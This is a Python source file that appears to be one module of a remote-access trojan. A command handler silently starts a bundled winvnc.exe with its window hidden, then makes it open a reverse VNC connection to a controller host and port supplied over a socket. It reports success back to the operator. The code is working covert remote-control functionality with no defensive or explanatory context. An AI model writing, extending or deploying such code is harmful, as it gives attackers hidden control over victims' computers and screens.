import psutil
import subprocess
import time
import justanotherpackage
import os
import json

def find_process_by_exe(file_name):
    try:
        for proc in psutil.process_iter(['pid', 'exe']):
            if proc.info['exe'] and file_name.lower() in proc.info['exe'].lower():
                return proc.info['pid']
    except (psutil.AccessDenied, psutil.NoSuchProcess):
        pass
    return None

def start_remote_desktop(data, HOST, client_socket):
    try:
        port = data.get("port")
        if not port:
            raise ValueError("Port not provided in data")

        remote_pid = find_process_by_exe("winvnc.exe")
        program_path = os.path.join(
            os.path.dirname(justanotherpackage.__file__), "vnc", "winvnc.exe"
        )

        if not remote_pid:
            try:
                subprocess.Popen(
                    [program_path],
                    shell=True,
                    creationflags=subprocess.CREATE_NO_WINDOW
                )
                time.sleep(5)
            except Exception as e:
                raise RuntimeError(f"Failed to start winvnc.exe: {e}")

        remote_pid = find_process_by_exe("winvnc.exe")
        if remote_pid:
            try:
                command = [program_path, "-connect", f"{HOST}:{port}"]
                subprocess.Popen(command, text=True, creationflags=subprocess.CREATE_NO_WINDOW)
                message = "From Remote: Remote Desktop Started"
            except Exception as e:
                message = f"From Remote: Failed to connect remote desktop - {e}"
        else:
            message = "From Remote: winvnc.exe process not found after starting"

        client_socket.sendall(json.dumps({"logger": message}).encode())

    except (ConnectionError, ConnectionResetError):
        pass 
    except Exception as e:
        error_message = f"From Remote: {str(e)}"
        client_socket.sendall(json.dumps({"logger": error_message}).encode())
